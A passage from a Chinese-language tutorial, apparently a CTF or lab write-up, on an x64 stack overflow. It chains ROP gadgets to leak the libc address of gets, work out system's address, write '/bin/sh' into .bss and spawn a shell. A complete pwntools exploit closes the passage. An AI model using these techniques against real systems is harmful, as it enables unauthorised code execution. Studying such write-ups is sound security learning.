这时重新调试rop在上面call的地方，我们单步进去，如图：
进来之后发现这里有处跳转，但是rax为0x56，跳转不能实现：
[
会不会正常执行printf时这里跳转实现了呢，我们在正常call _printf处时单步进去，然后F8一直跟踪到上述代码处，如图：
[
发现这里rax为0，也就是要正常执行prinf,还要保证rax为0。前面我们覆盖返回地址为0x40075a，在该处没有代码如下：
[
该处完全没有能控制rax的地方，那么怎么办呢？这样我们在返回执行0x40075a前，还要找到一处代码片段(gadget)控制rax为0，然后再跳到0x40075a处执行。通过搜索，发现0x4005f3
处有如下代码：
[
这里把eax置0，然后直接跳转到pop rbp处然后返回，可以满足我们的需求。然后我们把返回地址覆盖为0x4005f3，然后再填充一个0x0让其pop
ebp用，接着retn时返回地址我们就布置为上面的0x40075a，这样就完成了rax指令操作后又跳回去执行printf函数了。现在我们的rop链如下：
    rop='a'*72
    rop+=p64(0x4005f3)#      eax=0 or printf can't run normer
    rop+=p64(0x0)#
    rop+=p64(0x40075a)#
    rop+=p64(0x1f)#->rbx
    rop+=p64(0x20)#->rbp
    rop+=p64(printf_got_addr-0xf8)#execprintf
    rop+=p64(0x0)#
    rop+=p64(gets_got_addr)#
    rop+=p64(0x400784)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x400656)#   return to vul
替换后，调试如下：
[
这时已经将gets函数在libc里的地址打印出来了。并且rop返回到vuln函数去继续执行了。在附加调试的时候，在IDA找到system函数地址
和gets函数地址，计算两个地址之间的偏移：
[
然后我们把前面打印出来的gets函数地址减去这个偏移就得到了，目标系统里的system函数的地址。
### 五、ROP链构造执行system函数
获得了system函数地址后，接下来要做的就是执行system函数了。那么问题又来了，X64系统下，函数的参数都是房子寄存器里的，第一个参数地址放在rdi里，这样要执行sytem(‘/bin/sh’)我们就需要找到’/bin/sh’字符串的地址，然后把该地址放到rdi再去调用执行system
函数，才能获得shell。现在利用上面的gadget控制rdi是没有问题的，但是哪里有’/bin/sh’呢，其实在libc里面有’/bin/sh’也可以计算偏移得到地址，但是这里为了再巩固一下rop链的魅力，这里我们不用这个方法。
通过观察rop各区段信息，发现.bss段说可写的，我们可以利用rop技术执行gets函数，然后把’/bin/sh’读入到这个区域，然后记录其地址，并传给edi。用上面的gadget我们发现要执行call，如果能call到system函数里去，就一切都完美了。Call调用实际上是调用的
地址的地址，比如我们要执行system,那么假如我们把其地址放在 0x600b30处，这时执行call
0x600b30就会跳转到system地址处去执行。0x600b30刚好就是.bss段开始处，不防我们把system地址放到0x600b30处，把’/bin/sh’字符串放到0x600b38处。那么现在就要构造rop来执行gets函数了。我们看看原代码里gets函数相关的反汇编代码如下：
可以看到，gets执行后实际上是把输入的数据直接读入到了rdi指向的内存空间了，然后我们就控制rdi为0x600b30,然后一起读入system地址和/bin/sh。
所利用的代码片段如下：
[
根据前面的思路，这里要控制r15=rdi=0x600b30,r12=getsgot，rbx=0,rbp=1，这里不用控制rax为0了。然后构造rop链如下：
    rop='a'*72
    rop+=p64(0x40075a)#
    rop+=p64(0x0)#->rbx
    rop+=p64(0x1)#->rbp
    rop+=p64(gets_got_addr)#
    rop+=p64(0x0)#
    rop+=p64(0x0)#
    rop+=p64(0x600b30)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x40075a)#
上面是执行gets的过程，gets执行完后
就在0x600b30处布置好了system函数地址，在0x600b38处存放了’/bin/sh’串，最后我们还要再执行system函数，还要在此执行该代码片段，所以返回地址直接写成了0x40075a。
执行system，要控制system的参数为字符串’/bin/sh’的地址，即r15=rdi=0x600b38,r12=0x600b30(该地址存放着system的地址)，rbx=0,rbp=1。然后构造rop链如下：
    op+=p64(0x0)#->rbx
    rop+=p64(0x1)#->rbp
    rop+=p64(0x600b30)#execsystem
    rop+=p64(0x0)#
    rop+=p64(0x0)#
    rop+=p64(0x600b38)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x400656)#   return to vul
最后我们发送rop链过去
    arget.sendline(rop)
然后就会发生溢出执行gets函数读入数据：
[
从上图可以看到r12就是gets
got，rdi就是我们想写入数据的地方。栈里后面又布置了一片数据，用来在gets读完数据后，再返回去执行system。按f8后，这时再发送如下数据：
    target.sendline(p64(sys_addr)+'/bin/sh')
这时就会把system地址 和’/bin/sh’串放入0x600b30处，如图：
[
接着返回后又返回执行system函数，如图：
[
可以看到此刻call地址指向了system地址，参数edi存放的是’/bin/sh’地址，然后一路执行下去，就获得了SHELL，如图：
[
最后完整的EXP如下：
    #! /usr/bin/python
    from pwn import *
    import pdb
    context.log_level = 'debug'
    target = process('./rop')
    elf=ELF('./rop')
    gets_got_addr=elf.got['gets']
    printf_got_addr=elf.got['printf']
    print hex(gets_got_addr)
    rop='a'*72
    rop+=p64(0x4005f3)#     eax=0 or printf can't run normer
    rop+=p64(0x0)#
    rop+=p64(0x40075a)#
    rop+=p64(0x1f)#->rbx
    rop+=p64(0x20)#->rbp
    rop+=p64(printf_got_addr-0xf8)#exec printf
    rop+=p64(0x0)#
    rop+=p64(gets_got_addr)#
    rop+=p64(0x400784)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x400656)#  return to vul
    target.sendline(rop)
    target.recvuntil(':')
    target.recvuntil(': ')
    addr=target.recvline()[:-1]
    addr = u64(addr+'\x00'*(8-len(addr)))
    sys_addr=addr-0x2bdc0
    print 'sysaddr is:'
    print hex(sys_addr)
    rop='a'*72
    rop+=p64(0x40075a)#
    rop+=p64(0x0)#->rbx
    rop+=p64(0x1)#->rbp
    rop+=p64(gets_got_addr)#exec system
    rop+=p64(0x0)#
    rop+=p64(0x0)#
    rop+=p64(0x600b30)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x40075a)#  return to vul
    \#rop='a'*72
    \#rop+=p64(0x40075a)#
    rop+=p64(0x0)#->rbx
    rop+=p64(0x1)#->rbp
    rop+=p64(0x600b30)#exec system
    rop+=p64(0x0)#
    rop+=p64(0x0)#
    rop+=p64(0x600b38)#.bss
    rop+=p64(0x400740)#
    rop+=p64(0x0)*7#
    rop+=p64(0x400656)#  return to vul
    target.sendline(rop)
    target.sendline(p64(sys_addr)+'/bin/sh')
    target.sendline(rop)
    target.interactive()
### 六、总结
在漏洞学习研究的过程中，深感只有亲自去调试漏洞，孤独寂寞地去盯着寄存器的变化，盯着堆栈数据的变化，才能略知其中的奥妙，才能感受到前人的智慧光芒，才能深入理解漏洞成因和漏洞利用的艺术！